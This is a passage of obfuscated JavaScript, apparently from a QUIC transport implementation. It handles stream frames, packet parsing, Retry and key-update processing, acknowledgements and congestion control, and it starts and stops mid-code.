            f['byte'](a0c3['maxData'])[kM(0x18d)](this[kM(0x813)]), a[kM(0xb66)](f[kM(0x96c)]()), this[kM(0x199)] = ![], c -= a[d[kM(0x303)](a[kM(0xc54)], 0x1)]['length'];
        }
        for (const g of this[kM(0x580)][kM(0x47b)]()) {
            if (d[kM(0x1c0)](c, 0x14))
                break;
            const h = new a0c8();
            h[kM(0x73b)](a0c3[kM(0xae7)])[kM(0x18d)](g['id'])[kM(0x18d)](g[kM(0x347)]);
            const i = h[kM(0x96c)]();
            a['push'](i), c -= i[kM(0xc54)];
            const j = this[kM(0x580)][kM(0xe0a)](g);
            this[kM(0x580)][kM(0x8ee)](j, 0x1);
        }
    }
    ['_peerStreamLimit'](a) {
        const kN = a0d9, b = {
                'emNSN': function (c, d) {
                    return c === d;
                }
            };
        if (a['peerLimit'])
            return a['peerLimit'];
        return b[kN(0x101f)](a[kN(0x729)], kN(0x95a)) ? this[kN(0x482)] : this[kN(0x91d)];
    }
    ['_streamFrames'](a, b, c) {
        const kO = a0d9, d = {
                'GrAwB': function (f, g) {
                    return f < g;
                },
                'gqMlK': function (f, g) {
                    return f - g;
                },
                'BLTQt': function (f, g) {
                    return f - g;
                },
                'wrNOE': function (f, g) {
                    return f <= g;
                },
                'exyxL': function (f, g) {
                    return f === g;
                },
                'iTKqz': function (f, g) {
                    return f | g;
                },
                'wUnDz': function (f, g) {
                    return f >= g;
                },
                'oWBxO': function (f, g) {
                    return f + g;
                },
                'QTwll': function (f, g) {
                    return f | g;
                }
            };
        for (const f of this[kO(0xaa7)][kO(0x47b)]()) {
            if (d['GrAwB'](c, 0x18))
                break;
            const g = Math[kO(0x100f)](d['gqMlK'](this[kO(0x7dc)], this['connectionSent']), d['BLTQt'](this[kO(0xc18)](f), f['sentEnd']));
            if (d[kO(0x7a8)](g, 0x0))
                break;
            const h = f[kO(0x871)]['take'](Math[kO(0x100f)](d[kO(0x666)](c, 0x14), g));
            if (d[kO(0x4e0)](h, null)) {
                if (f[kO(0x871)][kO(0x5f2)]()) {
                    const n = new a0c8();
                    n[kO(0x73b)](d[kO(0xcf7)](d['iTKqz'](a0c3[kO(0x854)], 0x4) | 0x2, 0x1))[kO(0x18d)](f['id'])[kO(0x18d)](f[kO(0x871)][kO(0xe83)][kO(0xc54)])['varint'](0x0);
                    const o = n[kO(0x96c)]();
                    a['push'](o), c -= o[kO(0xc54)], b[kO(0x9c3)]['push']({
                        'stream': f,
                        'start': f[kO(0x871)][kO(0xe83)]['length'],
                        'length': 0x0,
                        'fin': !![]
                    });
                } else
                    this[kO(0xcce)](f);
                continue;
            }
            const i = d['wUnDz'](d[kO(0x61f)](h[kO(0x373)], h[kO(0xc54)]), f[kO(0x871)]['data'][kO(0xc54)]), j = d[kO(0x535)](0x4, 0x2) | (i && f[kO(0x871)]['fin'] ? 0x1 : 0x0), k = new a0c8();
            k[kO(0x73b)](d[kO(0x535)](a0c3[kO(0x854)], j))[kO(0x18d)](f['id'])[kO(0x18d)](h[kO(0x373)])['varint'](h[kO(0xc54)])[kO(0xbce)](h[kO(0xbce)]);
            const l = k[kO(0x96c)]();
            a[kO(0xb66)](l), c -= l['length'], b[kO(0x9c3)][kO(0xb66)]({
                'stream': f,
                'start': h[kO(0x373)],
                'length': h['length'],
                'fin': i && f[kO(0x871)][kO(0xea6)],
                'retransmitted': h[kO(0xe9c)]
            });
            const m = Math['max'](0x0, d[kO(0x155)](d[kO(0x61f)](h[kO(0x373)], h[kO(0xc54)]), f[kO(0xb54)]));
            f[kO(0xb54)] = Math[kO(0x37f)](f['sentEnd'], h['start'] + h[kO(0xc54)]), this[kO(0x370)] += m, f[kO(0x871)][kO(0x836)]() && this[kO(0xcce)](f);
        }
    }
    [a0d9(0xcce)](a) {
        const kP = a0d9, b = {
                'PkryX': function (d, f) {
                    return d >= f;
                }
            }, c = this[kP(0xaa7)][kP(0xe0a)](a);
        b[kP(0xf14)](c, 0x0) && this[kP(0xaa7)][kP(0x8ee)](c, 0x1);
    }
    ['markSendReady'](a) {
        const kQ = a0d9, b = {
                'lseqe': function (c, d) {
                    return c < d;
                }
            };
        b[kQ(0x706)](this['sendReady'][kQ(0xe0a)](a), 0x0) && this[kQ(0xaa7)][kQ(0xb66)](a);
    }
    [a0d9(0xa35)]() {
        const kR = a0d9, a = new a0cv(this, this[kR(0xf80)], 'local');
        return this[kR(0xf80)] += 0x4, this['streams']['set'](a['id'], a), a;
    }
    async [a0d9(0x7f2)](a, b, c) {
        const kS = a0d9, d = {
                'iKTEb': function (g, h) {
                    return g === h;
                },
                'tUImy': function (g, h) {
                    return g + h;
                },
                'fJipS': 'unknown\x20stream\x20'
            }, f = this[kS(0x9c3)][kS(0xb12)](a);
        if (d['iKTEb'](f, undefined))
            throw new Error(d[kS(0x20f)](d[kS(0xf19)], a));
        f['write'](b, c);
    }
    ['_transmit'](a) {
        const kT = a0d9, b = {
                'QRLiO': kT(0x2dd),
                'RuHGs': function (c, d) {
                    return c === d;
                },
                'GDAEF': function (c, d) {
                    return c + d;
                },
                'SkATV': function (c, d) {
                    return c + d;
                },
                'yywdo': kT(0x1a7),
                'PALcH': kT(0x3ba),
                'nGBwm': kT(0x1a2),
                'pUgYj': function (c, d) {
                    return c === d;
                },
                'mtPsN': function (c, d) {
                    return c + d;
                },
                'ISfcQ': function (c, d) {
                    return c + d;
                },
                'FJmNP': function (c, d) {
                    return c + d;
                },
                'LWnsI': function (c, d) {
                    return c + d;
                },
                'GjYHO': 'tx\x20',
                'AzNQy': function (c, d) {
                    return c !== d;
                },
                'bgYyP': function (c, d) {
                    return c === d;
                }
            };
        if (b[kT(0x103a)](this[kT(0x102e)], null) || this['closed'])
            return;
        this[kT(0x102e)][kT(0x871)](a[kT(0x83b)], 0x0, a['packet'][kT(0xc54)], this['port'], this[kT(0xd00)], c => {
            const kU = kT;
            c && !this['closed'] && this[kU(0x4c7)]['debug'](b[kU(0x526)] + c[kU(0x769)]);
        });
        if (process.env.KISAMA_QUIC_DEBUG && b[kT(0x103a)](a['epoch'], 0x1) && this['stats']['tx'] <= 0x28)
            this[kT(0x4c7)][kT(0xfdf)](b[kT(0xa5c)](b['SkATV'](b[kT(0xb1f)], a['pn']) + b[kT(0x738)], a[kT(0x83b)]['toString'](b[kT(0xb7c)])));
        this[kT(0xfd8)]['tx'] += 0x1, this[kT(0xfd8)][kT(0xc60)] += a[kT(0x83b)]['length'];
        b['pUgYj'](a[kT(0xb06)], a0bZ) && (this[kT(0x3b3)] += 0x1);
        a['epoch'] === a0c0 && b['RuHGs'](this['cryptoSend'][a0c0][kT(0x50d)][kT(0xc54)], 0x0) && (this[kT(0x918)] = !![]);
        this[kT(0x4c7)][kT(0xac2)](b[kT(0xdd3)](b[kT(0x93a)](b[kT(0x93a)](b['FJmNP'](b[kT(0x62e)](b[kT(0xc2c)] + a['packet'][kT(0xc54)] + 'B\x20', a0c2[a[kT(0xb06)]]) + '\x20pn=', a['pn']), '\x20['), a[kT(0xc25)]), ']'));
        if (a[kT(0x82c)]) {
            const c = b[kT(0xf65)](a['meta'][kT(0x226)], null) && b[kT(0xdc2)](a['meta'][kT(0x226)][kT(0xe9c)], !![]) || a[kT(0x40e)]['streams'][kT(0x286)](d => d[kT(0xe9c)] === !![]);
            this[kT(0x964)][a[kT(0xb06)]][kT(0xb66)]({
                'pn': a['pn'],
                'time': Date[kT(0x8da)](),
                'bytes': a[kT(0x83b)]['length'],
                'crypto': a[kT(0x40e)][kT(0x226)],
                'streams': a[kT(0x40e)][kT(0x9c3)],
                'retransmitted': c
            }), this[kT(0xbc8)] = Date['now']();
        }
    }
    ['_onDatagram'](a) {
        const kV = a0d9, b = {
                'eQltP': function (d, f) {
                    return d & f;
                },
                'jnrTX': function (d, f) {
                    return d === f;
                },
                'TQIDc': function (d, f) {
                    return d + f;
                },
                'AVDsk': kV(0xdf7),
                'pdaZB': function (d, f) {
                    return d === f;
                },
                'rzOFN': function (d, f) {
                    return d + f;
                }
            };
        this[kV(0xfd8)]['rx'] += 0x1, this[kV(0xfd8)][kV(0x1077)] += a[kV(0xc54)], this[kV(0x893)] = Date[kV(0x8da)]();
        let c = 0x0;
        while (c < a[kV(0xc54)]) {
            const d = a[c];
            if (!b['eQltP'](d, 0x80)) {
                this[kV(0x810)](a[kV(0xad0)](c));
                return;
            }
            const f = a[kV(0xad0)](c), g = this[kV(0x6e8)](f, 0x0);
            if (b[kV(0x1032)](g, null))
                return;
            if (g[kV(0x227)] !== a0bQ) {
                this[kV(0x4c7)][kV(0xac2)](b[kV(0xdb0)](b[kV(0xda9)], g['version'][kV(0x43a)](0x10)));
                return;
            }
            if (b['pdaZB'](g[kV(0xa49)], 0x3)) {
                this[kV(0xa76)](g);
                return;
            }
            const h = Math[kV(0x100f)](f[kV(0xc54)], b[kV(0xa71)](g[kV(0x80d)], g[kV(0xc54)]));
            this['_handleLong'](f[kV(0xad0)](0x0, h), g), c += h;
        }
    }
    [a0d9(0x6e8)](a, b) {
        const kW = a0d9, c = {
                'BsPIW': function (o, p) {
                    return o < p;
                },
                'wGSvM': function (o, p) {
                    return o - p;
                },
                'RcnjD': function (o, p) {
                    return o >> p;
                },
                'kXPkV': function (o, p) {
                    return o + p;
                },
                'ruqNa': function (o, p) {
                    return o + p;
                },
                'VLFMr': function (o, p, q) {
                    return o(p, q);
                },
                'scSAp': function (o, p) {
                    return o === p;
                },
                'COBnR': function (o, p) {
                    return o(p);
                },
                'ZaIVZ': function (o, p) {
                    return o === p;
                }
            };
        if (c[kW(0xb62)](c[kW(0x626)](a[kW(0xc54)], b), 0x7))
            return null;
        const d = a[b], f = a['readUInt32BE'](b + 0x1), g = c[kW(0xe57)](d & 0x30, 0x4);
        let h = c[kW(0x9d7)](b, 0x5);
        const i = a[h];
        h += 0x1;
        if (c[kW(0xb62)](c[kW(0x626)](a[kW(0xc54)], h), c[kW(0xd1b)](i, 0x1)))
            return null;
        const j = a['subarray'](h, c[kW(0xd1b)](h, i));
        h += i;
        const k = a[h];
        h += 0x1;
        if (c[kW(0x626)](a[kW(0xc54)], h) < k)
            return null;
        const l = a[kW(0xad0)](h, c[kW(0x9d7)](h, k));
        h += k;
        let m = Buffer[kW(0x901)](0x0);
        if (g === 0x0) {
            const o = c[kW(0xf67)](a0c7, a, h);
            if (c[kW(0x69d)](o, null))
                return null;
            h += o[0x1];
            const p = c['COBnR'](Number, o[0x0]);
            if (c['wGSvM'](a[kW(0xc54)], h) < p)
                return null;
            m = a[kW(0xad0)](h, c[kW(0x9d7)](h, p)), h += p;
        }
        if (c['scSAp'](g, 0x3))
            return {
                'first': d,
                'type': g,
                'version': f,
                'dcid': j,
                'scid': l,
                'token': a[kW(0xad0)](h, c[kW(0x626)](a[kW(0xc54)], 0x10)),
                'pnOffset': 0x0,
                'length': 0x0,
                'retry': !![]
            };
        const n = c[kW(0xf67)](a0c7, a, h);
        if (c[kW(0xa31)](n, null))
            return null;
        return h += n[0x1], {
            'first': d,
            'type': g,
            'version': f,
            'dcid': j,
            'scid': l,
            'token': m,
            'pnOffset': h,
            'length': c[kW(0xf32)](Number, n[0x0]),
            'retry': ![]
        };
    }
    ['_handleRetry'](a) {
        const kX = a0d9, b = {
                'tweFo': kX(0x30c),
                'rhQfN': function (f, g) {
                    return f + g;
                },
                'UvBQt': kX(0xc89),
                'JrwcH': kX(0x1a2)
            }, c = b[kX(0x48c)]['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[kX(0x964)][a0bZ] = [];
                continue;
            case '1':
                this[kX(0xc88)] = Buffer[kX(0xca5)](a['token']);
                continue;
            case '2':
                this['initialSent'] = 0x0;
                continue;
            case '3':
                this['peerCid'] = Buffer[kX(0xca5)](a[kX(0xc6c)]);
                continue;
            case '4':
                this[kX(0x6ce)][a0bZ] = 0x0;
                continue;
            case '5':
                this[kX(0x9f9)][a0bZ]['loss']();
                continue;
            case '6':
                this[kX(0x4c7)][kX(0xac2)](b[kX(0xf04)](b[kX(0xf04)](b[kX(0xf04)](b[kX(0xb8f)], a['token']['length']), kX(0x33e)), a['scid'][kX(0x43a)](b['JrwcH'])));
                continue;
            }
            break;
        }
    }
    ['_epochForType'](a) {
        const kY = a0d9, b = {
                'gnKwP': function (c, d) {
                    return c === d;
                },
                'rybMx': function (c, d) {
                    return c === d;
                }
            };
        if (b[kY(0xdac)](a, 0x0) || b[kY(0xf22)](a, 0x1))
            return a0bZ;
        return a0c0;
    }
    ['_handleLong'](a, b) {
        const kZ = a0d9, c = {
                'zXNSK': function (m, n) {
                    return m < n;
                },
                'qZOfW': function (m, n, o, p, q) {
                    return m(n, o, p, q);
                },
                'xuPWL': function (m, n) {
                    return m === n;
                },
                'oqmjU': function (m, n) {
                    return m + n;
                },
                'DHGex': function (m, n, o, p) {
                    return m(n, o, p);
                },
                'EMDto': function (m, n) {
                    return m * n;
                },
                'TScNQ': function (m, n) {
                    return m + n;
                },
                'VBRmW': function (m, n) {
                    return m + n;
                },
                'lqjsv': kZ(0x68a),
                'kvupc': kZ(0x6b4),
                'dKikB': function (m, n) {
                    return m + n;
                },
                'LuEDx': kZ(0x1a2),
                'Wpvvv': function (m, n) {
                    return m + n;
                },
                'pukUc': function (m, n) {
                    return m + n;
                },
                'JwPVp': kZ(0x1079)
            }, d = this['_epochForType'](b[kZ(0xa49)]), f = this[kZ(0xfa8)][d];
        if (f === null) {
            this['stats'][kZ(0x18b)] += 0x1;
            return;
        }
        if (c[kZ(0x8ef)](b[kZ(0xc54)], a0bW)) {
            this[kZ(0xfd8)][kZ(0x18b)] += 0x1;
            return;
        }
        const g = c[kZ(0x22b)](a0cl, f[kZ(0xe5a)], a, b[kZ(0x80d)], !![]);
        if (c[kZ(0xbe9)](g, null)) {
            this[kZ(0xfd8)][kZ(0x18b)] += 0x1;
            return;
        }
        const [h, i] = g, j = c['oqmjU'](h[0x0] & 0x3, 0x1), k = c[kZ(0x29a)](a0cm, Math['max'](this['largestRecv'][d], 0x0), c['EMDto'](j, 0x8), i);
        let l;
        try {
            l = f['recv']['open'](k, h, a['subarray'](c[kZ(0x653)](b[kZ(0x80d)], j)));
        } catch (m) {
            this['stats'][kZ(0x18b)] += 0x1, this[kZ(0x4c7)][kZ(0xac2)](c[kZ(0xdec)](c['TScNQ'](c[kZ(0x484)](c[kZ(0x646)], a[kZ(0xc54)]), 'B\x20') + a0c2[d], c['kvupc']));
            return;
        }
        c[kZ(0xbe9)](d, a0bZ) && c[kZ(0xbe9)](b['dcid'][kZ(0xc54)], this[kZ(0x45a)][kZ(0xc54)]) && b['dcid'][kZ(0x9bd)](this[kZ(0x45a)]) && (!this[kZ(0xd84)] && b['scid']['length'] && !this['peerCid'][kZ(0x9bd)](b[kZ(0xc6c)]) && (this[kZ(0xfdd)] = Buffer['from'](b['scid']), this[kZ(0x4c7)][kZ(0xac2)](c['dKikB'](kZ(0x1048), this[kZ(0xfdd)]['toString'](c[kZ(0xd60)]))))), this[kZ(0xf27)](d, k), this[kZ(0x4c7)][kZ(0xac2)](c[kZ(0x484)](c['oqmjU'](c[kZ(0x435)](c[kZ(0xb9d)](c[kZ(0x646)], a['length']), 'B\x20'), a0c2[d]), c['JwPVp']) + k), d === a0c0 && this[kZ(0x13e)](a0bZ, kZ(0x9c5)), this[kZ(0xb84)](l, d);
    }
    [a0d9(0x810)](a) {
        const l0 = a0d9, b = {
                'MPqFh': function (i, j) {
                    return i === j;
                },
                'bQpqt': function (i, j) {
                    return i + j;
                },
                'jCJiE': function (i, j) {
                    return i + j;
                },
                'cxKLO': l0(0x68a),
                'jvvRv': l0(0x1061),
                'ZVKTv': function (i, j) {
                    return i + j;
                },
                'QVDTS': function (i, j) {
                    return i < j;
                },
                'GFSPX': function (i, j) {
                    return i(j);
                },
                'xDDLF': function (i, j) {
                    return i - j;
                },
                'YbjYI': function (i, j, k, l, m) {
                    return i(j, k, l, m);
                },
                'LytnV': function (i, j) {
                    return i & j;
                },
                'LzKhP': function (i, j, k, l) {
                    return i(j, k, l);
                },
                'DwlBQ': function (i, j) {
                    return i * j;
                },
                'Vgdtj': l0(0x9e4),
                'iFXed': l0(0x4a7),
                'agqIu': l0(0x339),
                'Esdwp': function (i, j, k) {
                    return i(j, k);
                },
                'vmhoq': function (i, j) {
                    return i > j;
                },
                'eKtaF': function (i, j) {
                    return i + j;
                },
                'KJMTC': l0(0x6c5)
            }, c = this[l0(0xfa8)][a0c1];
        if (b['MPqFh'](c, null)) {
            this[l0(0xfd8)][l0(0x18b)] += 0x1, this[l0(0x4c7)]['debug'](b[l0(0x6b0)](b[l0(0x2a0)](b['cxKLO'], a[l0(0xc54)]), b[l0(0xed0)]));
            return;
        }
        b['MPqFh'](this['appRecvGens'][l0(0xc54)], 0x0) && this[l0(0xc4b)]['push']({
            'keys': c[l0(0xe5a)],
            'phase': 0x0
        });
        const d = b[l0(0x167)](0x1, this[l0(0x45a)][l0(0xc54)]), f = [];
        for (const i of [c[l0(0xe5a)]]['concat'](this[l0(0xc4b)]['map'](j => j['keys']))) {
            b[l0(0x88a)](f[l0(0xe0a)](i), 0x0) && f[l0(0xb66)](i);
        }
        const g = this['appRecvGens'][0x0], h = this['appRecvGens']['concat']([{
                    'keys': b[l0(0x8f4)](a0ce, g[l0(0xfa8)]),
                    'phase': b[l0(0xfde)](0x1, g['phase']),
                    'next': !![]
                }]);
        for (const j of h) {
            for (const k of j[l0(0x9ad)] ? f[l0(0x83f)]([j[l0(0xfa8)]]) : f) {
                const l = b[l0(0xef6)](a0cl, k, a, d, ![]);
                if (b['MPqFh'](l, null))
                    continue;
                const [m, n] = l, o = b['LytnV'](m[0x0], 0x3) + 0x1, p = b[l0(0x3ca)](a0cm, Math[l0(0x37f)](this[l0(0x3f0)][a0c1], 0x0), b['DwlBQ'](o, 0x8), n);
                let q;
                try {
                    q = j[l0(0xfa8)][l0(0x7c9)](p, m, a[l0(0xad0)](b['bQpqt'](d, o)));
                } catch (r) {
                    continue;
                }
                if (j[l0(0x9ad)]) {
                    const s = b['Vgdtj'][l0(0xa6a)]('|');
                    let t = 0x0;
                    while (!![]) {
                        switch (s[t++]) {
                        case '0':
                            this[l0(0xc4b)]['unshift']({
                                'keys': j[l0(0xfa8)],
                                'phase': j['phase']
                            });
                            continue;
                        case '1':
                            this[l0(0x4c7)][l0(0xac2)](b[l0(0x167)](b[l0(0x280)] + j[l0(0x62f)], b['agqIu']));
                            continue;
                        case '2':
                            this[l0(0x28d)] = j[l0(0x62f)];
                            continue;
                        case '3':
                            this[l0(0x6de)][j['phase']] = b['Esdwp'](a0ce, this[l0(0x6de)][b[l0(0xfde)](0x1, j[l0(0x62f)])], !![]);
                            continue;
                        case '4':
                            b['vmhoq'](this[l0(0xc4b)][l0(0xc54)], 0x2) && this[l0(0xc4b)][l0(0xbfa)]();
                            continue;
                        }
                        break;
                    }
                }
                this[l0(0xf27)](a0c1, p), this[l0(0x4c7)][l0(0xac2)](b['ZVKTv'](b['ZVKTv'](l0(0x68a) + a[l0(0xc54)], l0(0xb82)), p)), this[l0(0xb84)](q, a0c1);
                return;
            }
        }
        this[l0(0xfd8)]['dropped'] += 0x1, this[l0(0x4c7)]['debug'](b['bQpqt'](b[l0(0x78f)](b[l0(0x662)], a[l0(0xc54)]), b[l0(0xe39)]));
    }
    [a0d9(0xf27)](a, b) {
        const l1 = a0d9, c = {
                'xaHyn': function (d, f, g) {
                    return d(f, g);
                },
                'UzcjS': function (d, f) {
                    return d > f;
                }
            };
        this[l1(0xaa5)][a] = c[l1(0x97d)](a0ch, this['recvRanges'][a], [{
                'start': b,
                'length': 0x1
            }]), c['UzcjS'](b, this[l1(0x3f0)][a]) && (this[l1(0x3f0)][a] = b), this['ackPending'][a] = !![];
    }
    [a0d9(0x800)](a, b) {
        const l2 = a0d9, c = {
                'UiaTX': function (m, n) {
                    return m + n;
                },
                'JSbHt': function (m, n) {
                    return m === n;
                },
                'QQycp': function (m, n) {
                    return m - n;
                },
                'KPSVP': function (m, n) {
                    return m >= n;
                },
                'HcMoS': function (m, n) {
                    return m !== n;
                },
                'rLfLK': function (m, n) {
                    return m < n;
                }
            }, d = Date[l2(0x8da)](), f = this['inFlight'][a];
        let g = -0x1;
        for (const m of b) {
            g = Math[l2(0x37f)](g, m[l2(0x373)] + m[l2(0xc54)] - 0x1);
        }
        const h = [];
        let i = 0x0, j = null;
        for (const n of f) {
            let o = ![];
            for (const p of b) {
                if (n['pn'] >= p[l2(0x373)] && n['pn'] < c[l2(0xf74)](p[l2(0x373)], p[l2(0xc54)])) {
                    o = !![];
                    break;
                }
            }
            if (!o) {
                h[l2(0xb66)](n);
                continue;
            }
            i += n[l2(0xbce)];
            c['JSbHt'](n['pn'], g) && n[l2(0xe9c)] !== !![] && (j = c[l2(0xb38)](d - n[l2(0x32e)], Math[l2(0x100f)](b[l2(0xb2e)] || 0x0, this[l2(0x20e)])));
            n[l2(0x226)] && this[l2(0x9f9)][a]['ack'](n[l2(0x226)][l2(0x373)], n[l2(0x226)][l2(0xc54)], ![]);
            for (const q of n[l2(0x9c3)]) {
                q[l2(0x854)][l2(0x871)]['ack'](q[l2(0x373)], q['length'], q[l2(0xea6)]);
            }
        }
        const k = [], l = [];
        for (const r of h) {
            c[l2(0x413)](g - r['pn'], this[l2(0x717)]) ? l['push'](r) : k['push'](r);
        }
        this[l2(0x964)][a] = k;
        i && (c[l2(0x4cd)](j, null) && j > 0x0 && this[l2(0x4f7)](j), this['onSendProgress'](), this[l2(0xbd4)](i));
        for (const s of l) {
            this[l2(0x7cb)](a, s);
        }
        l[l2(0xc54)] && this['_onLoss'](a), c[l2(0x56c)](a, a0c1) && c[l2(0xe72)](k[l2(0xc54)], f[l2(0xc54)]) && this[l2(0x436)]();
    }
    [a0d9(0xbd4)](a) {
        const l3 = a0d9, b = {
                'dbigo': function (c, d) {
                    return c < d;
                },
                'MVPZZ': function (c, d) {
                    return c * d;
                }
            };
        b[l3(0xcb9)](this[l3(0xce0)], this[l3(0xc6a)]) ? this[l3(0xce0)] += a : this[l3(0xce0)] += Math['max'](0x1, Math[l3(0x568)](b['MVPZZ'](this['maxPacket'], a) / this[l3(0xce0)])), this[l3(0xce0)] = Math[l3(0x100f)](this[l3(0xce0)], this['maxWindow']);
    }
    [a0d9(0xb84)](a, b) {
        const l4 = a0d9, c = {
                'eoNNQ': function (f, g) {
                    return f > g;
                },
                'gQuoJ': function (f, g) {
                    return f === g;
                },
                'CZWbQ': function (f, g) {
                    return f === g;
                },
                'OUwrv': function (f, g) {
                    return f === g;
                },
                'mGikT': function (f, g) {
                    return f(g);
                },
                'ocOrJ': function (f, g) {
                    return f < g;
                },
                'qbIhN': function (f, g) {
                    return f === g;
                },
                'rbkRb': function (f, g) {
                    return f & g;
                },
                'TjWzc': function (f, g) {
                    return f(g);
                },
                'nRcOH': function (f, g) {
                    return f === g;
                },
                'JqeVd': function (f, g) {
                    return f !== g;
                },
                'EnSMF': function (f, g) {
                    return f === g;
                },
                'MsMbi': function (f, g) {
                    return f === g;
                },
                'cspVe': function (f, g) {
                    return f < g;
                },
                'KlhKR': function (f, g) {
                    return f + g;
                },
                'lgHDf': function (f, g) {
                    return f === g;
                },
                'CySYv': function (f, g) {
                    return f + g;
                },
                'sqogv': function (f, g) {
                    return f + g;
                },
                'xCePF': l4(0xe9e),
                'MCdvR': '\x20reason=',
                'pNgqp': function (f, g) {
                    return f + g;
                },
                'rDXsz': l4(0x4b3)
            }, d = new a0c9(a);
        while (c['eoNNQ'](d[l4(0x190)], 0x0)) {
            const f = d[l4(0x73b)]();
            if (c[l4(0xe70)](f, a0c3[l4(0xa62)]))
                continue;
            if (c['CZWbQ'](f, a0c3[l4(0xbc9)]))
                continue;
            if (c[l4(0xe70)](f, a0c3['ack']) || c[l4(0x785)](f, a0c3[l4(0x2bf)])) {
                const g = c[l4(0xcdf)](a0co, d);
                f === a0c3['ackEcn'] && (d[l4(0x18d)](), d[l4(0x18d)](), d[l4(0x18d)]());
                this['_applyAck'](b, g);
                continue;
            }
            if (c['OUwrv'](f, a0c3['crypto'])) {
                const h = d[l4(0x31f)](), i = d[l4(0x31f)]();
                if (c[l4(0x4e6)](d[l4(0x190)], i))
                    return;
                const j = d['bytes'](i), k = this['tlsOffsets'][b]['accept'](h, j);
                k['length'] && this[l4(0x312)](b, k);
                continue;
            }
            if (c[l4(0xb65)](f & 0xf8, a0c3[l4(0x854)])) {
                const l = c[l4(0x76c)](f, 0x7), m = c['TjWzc'](Number, d['varint']()), n = c[l4(0x56a)](Boolean, l & 0x2), o = c['TjWzc'](Boolean, l & 0x4), p = Boolean(l & 0x1);
                let q = 0x0;
                o && (q = d[l4(0x31f)]());
                let r = d[l4(0x190)];
                n && (r = d[l4(0x31f)]());
                if (c['ocOrJ'](d[l4(0x190)], r))
                    return;
                this[l4(0x624)](m, q, d[l4(0xbce)](r), p);
                continue;
            }
            if (c['nRcOH'](f, a0c3['maxData'])) {
                this[l4(0x7dc)] = Math['max'](this[l4(0x7dc)], d[l4(0x31f)]());
                continue;
            }
            if (c[l4(0x6b6)](f, a0c3['maxStreamData'])) {
                const s = d[l4(0x31f)](), t = this[l4(0x9c3)][l4(0xb12)](s);
                c[l4(0x407)](t, undefined) ? t['peerLimit'] = Math['max'](t[l4(0xb7a)] || 0x0, d[l4(0x31f)]()) : d['varint']();
                continue;
            }
            if (c[l4(0x53e)](f, a0c3['maxStreamsBidi']) || f === a0c3[l4(0x8ff)]) {
                d[l4(0x18d)]();
                continue;
            }
            if (c[l4(0x412)](f, a0c3['newConnectionId'])) {
                d['varint'](), d[l4(0x18d)]();
                const u = d[l4(0x73b)]();
                if (c[l4(0x2d2)](d[l4(0x190)], c[l4(0xe74)](u, 0x10)))
                    return;
                d[l4(0xbce)](u), d[l4(0xbce)](0x10);
                continue;
            }
            if (c[l4(0x5dc)](f, a0c3[l4(0xb08)])) {
                d['varint']();
                continue;
            }
            if (c[l4(0x412)](f, a0c3[l4(0x59b)])) {
                if (c[l4(0x4e6)](d[l4(0x190)], 0x8))
                    return;
                const v = d[l4(0xbce)](0x8), w = new a0c8();
                w['byte'](a0c3[l4(0xa6c)])[l4(0xbce)](v), this['_queueOneOffFrame'](w[l4(0x96c)](), b);
                continue;
            }
            if (c[l4(0xb65)](f, a0c3[l4(0xa6c)]))
                continue;
            if (f === a0c3[l4(0x787)]) {
                this[l4(0x436)]();
                continue;
            }
            if (c[l4(0x412)](f, a0c3[l4(0x3a7)])) {
                const x = d['number']();
                d[l4(0x18d)](), d[l4(0x18d)]();
                const y = this[l4(0x9c3)][l4(0xb12)](x);
                c['JqeVd'](y, undefined) && (y[l4(0x6e0)] = !![], this['onStreamEnd'](y));
                continue;
            }
            if (f === a0c3[l4(0x166)]) {
                d['varint'](), d[l4(0x18d)]();
                continue;
            }
            if (c[l4(0x785)](f, a0c3[l4(0x974)])) {
                const z = d[l4(0x31f)]();
                this['peerToken'] = Buffer[l4(0xca5)](d[l4(0xbce)](z));
                continue;
            }
            if (c[l4(0xd48)](f, a0c3[l4(0x5ed)]) || c[l4(0x785)](f, a0c3[l4(0x637)])) {
                const A = d[l4(0x31f)]();
                let B = 0x0;
                c[l4(0x6b6)](f, a0c3['transportClose']) && (B = d[l4(0x31f)]());
                const C = d['remaining'] ? d[l4(0xbce)](d['remaining'])[l4(0x43a)](l4(0xec2)) : '';
                this['_fail'](c[l4(0xe74)](c[l4(0x18e)](c['sqogv'](c[l4(0x105a)], A), c[l4(0x9fb)]), C));
                return;
            }
            if (f === a0c3[l4(0xf87)] || f === a0c3['datagramLen']) {
                let D = d['remaining'];
                c['qbIhN'](f, a0c3[l4(0xad6)]) && (D = d[l4(0x31f)]());
                if (c[l4(0x2d2)](d[l4(0x190)], D))
                    return;
                d[l4(0xbce)](D);
                continue;
            }
            this[l4(0x252)](c[l4(0x3e8)](c[l4(0x8ae)], f[l4(0x43a)](0x10)));
            return;
        }
    }
    [a0d9(0x7d7)](a, b) {
        const l5 = a0d9;
        this[l5(0xa7b)][b] = !![], this[l5(0x403)] = this[l5(0x403)] || [], this[l5(0x403)][l5(0xb66)]({
            'epoch': b,
            'frame': a
        });
    }
    [a0d9(0x624)](a, b, c, d) {
        const l6 = a0d9, f = {
                'qRyME': function (i, j) {
                    return i === j;
                },
                'LXlHP': function (i, j) {
                    return i & j;
                },
                'msfoC': 'remote',
                'ERxsP': l6(0x95a),
                'zmcsj': l6(0x2d3),
                'CEaUv': function (i, j) {
                    return i < j;
                },
                'rbiVp': function (i, j) {
                    return i - j;
                },
                'BxOCA': function (i, j) {
                    return i + j;
                },
                'FXKFI': function (i, j) {
                    return i - j;
                },
                'tvSKW': function (i, j) {
                    return i / j;
                },
                'oNQUR': function (i, j) {
                    return i + j;
                },
                'NdDNX': function (i, j) {
                    return i === j;
                }
            };
        let g = this['streams'][l6(0xb12)](a);
        f[l6(0x856)](g, undefined) && (g = new a0cv(this, a, f[l6(0x3c9)](a, 0x1) === 0x1 ? f[l6(0x7a0)] : f['ERxsP']), this[l6(0x9c3)][l6(0x42d)](a, g), this[l6(0xc7b)](g));
        const h = g[l6(0xddd)][l6(0x85a)](b, c);
        if (h[l6(0xc54)]) {
            const i = f[l6(0x92e)][l6(0xa6a)]('|');
            let j = 0x0;
            while (!![]) {
                switch (i[j++]) {
                case '0':
                    f[l6(0xd17)](f[l6(0x8be)](g[l6(0x347)], g[l6(0xe5a)]['length']), this[l6(0x58a)] / 0x2) && (g[l6(0x347)] = f[l6(0x1005)](g[l6(0xe5a)]['length'], this['receiveWindow']), f[l6(0xd17)](this[l6(0x580)]['indexOf'](g), 0x0) && this[l6(0x580)][l6(0xb66)](g));
                    continue;
                case '1':
